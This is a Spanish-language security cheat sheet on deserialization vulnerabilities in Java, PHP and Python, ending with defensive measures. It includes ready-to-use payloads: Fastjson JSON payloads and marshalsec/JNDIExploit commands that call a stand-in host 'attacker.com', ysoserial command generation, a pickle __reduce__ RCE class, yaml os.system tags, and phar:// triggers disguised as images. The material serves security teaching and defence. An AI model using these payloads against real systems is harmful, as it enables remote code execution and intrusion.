# Seguridad Web - Vulnerabilidades de deserialización

> Fuente: base de vulnerabilidades WooYun | separado de web-injection.md

## V. Vulnerabilidades de deserialización

### 5.1 Esencia de la vulnerabilidad

```
Datos serializados (no confiables) -> función de deserialización -> la reconstrucción del objeto dispara métodos mágicos/callbacks -> ejecución de lógica maliciosa
```

**Fórmula central**: RCE por deserialización = entrada serializada controlable + clase peligrosa presente en el classpath/ámbito + cadena de explotación alcanzable (Gadget Chain)

### 5.2 Deserialización en Java

**Indicadores de detección**

```
Flujo binario: AC ED 00 05 (cabecera hex)
Base64:   rO0AB (cabecera codificada)
Ubicaciones comunes: Cookie, ViewState, JMX, RMI, protocolo T3, cuerpo HTTP
```

**Referencia rápida de cadenas de explotación (Gadget Chains)**

| Cadena de explotación | Librería dependiente | Modo de disparo | Herramienta |
|--------|--------|----------|------|
| Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
| Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
| Fastjson | fastjson < 1.2.68 | `@type` autoType | manual/herramienta dedicada |
| Jackson | jackson-databind | Deserialización polimórfica | ysoserial |
| Inyección JNDI | JDK < 8u191 | Carga remota de clases vía LDAP/RMI | JNDIExploit/marshalsec |

**Payload clásico de Fastjson**

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}

// Bypass de caché en 1.2.47
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
```

**Cadena de herramientas**

```bash
# Generar payload con ysoserial
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64

# Servicio de inyección JNDI
java -jar JNDIExploit.jar -i attacker_ip

# Iniciar servidor LDAP/RMI malicioso con marshalsec
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
```

### 5.3 Deserialización en PHP

**Indicadores de detección**

```
Formato: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
Función clave: unserialize(), disparo mediante protocolo phar://
```

**Cadena de explotación de métodos mágicos**

| Método | Momento de disparo | Modo de explotación |
|------|----------|----------|
| `__wakeup()` | Al llamar a unserialize() | Sobrescritura de propiedad→operación peligrosa |
| `__destruct()` | Al destruirse el objeto | Eliminación/escritura de archivo/ejecución de comandos |
| `__toString()` | Cuando el objeto se usa como cadena | Concatenación en una función peligrosa |
| `__call()` | Al llamar a un método inexistente | Trampolín de llamadas encadenadas |

**Idea de construcción de cadena POP**

```
1. Encontrar la entrada: método en __wakeup()/__destruct() que invoca una propiedad $this->xxx
2. Trampolín: enlazar con otras clases mediante __toString()/__call()/__get()
3. Punto final: llegar a una función peligrosa como system()/eval()/file_put_contents()
4. Construcción: controlar los valores de las propiedades para que la cadena quede completamente conectada
```

**Deserialización Phar (sin necesidad de llamar a unserialize)**

```php
// Las funciones de operación de archivos disparan la deserialización phar://
file_exists('phar://upload/evil.phar');
is_dir('phar://upload/evil.jpg');      // disfrazado con extensión de imagen
```

### 5.4 Deserialización en Python

**Funciones peligrosas**

```python
import pickle, yaml, marshal

# pickle - la más común
pickle.loads(data)      # deserializar
pickle.load(file)       # deserializar desde archivo

# yaml - requiere Loader
yaml.load(data)         # inseguro por defecto (versiones antiguas)
yaml.load(data, Loader=yaml.FullLoader)  # carga restringida

# marshal - a nivel de bytecode
marshal.loads(data)     # cargar objeto de código
```

**Payload RCE con pickle**

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
# Construcción manual equivalente:
# pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
```

**Payload RCE con yaml**

```yaml
!!python/object/apply:os.system ['whoami']
# o
!!python/object/new:subprocess.check_output [['whoami']]
```

### 5.5 Medidas de defensa

```java
// Java: filtrado por lista blanca en ObjectInputStream
ObjectInputStream ois = new ObjectInputStream(input) {
    @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
        return super.resolveClass(desc);
    }
};
```

- **Java**: actualizar componentes (Fastjson/Jackson/Commons-Collections), deshabilitar autoType, usar un filtro de deserialización con lista blanca
- **PHP**: evitar que unserialize() procese entrada del usuario, usar json_decode como alternativa, deshabilitar el protocolo phar://
- **Python**: usar `yaml.safe_load()` en lugar de `yaml.load()`, prohibir que pickle procese datos no confiables, usar JSON
- **General**: evitar transmitir datos en formatos de serialización nativos, unificar el uso de JSON; aplicar verificación de firma/HMAC en los puntos de entrada de deserialización

---
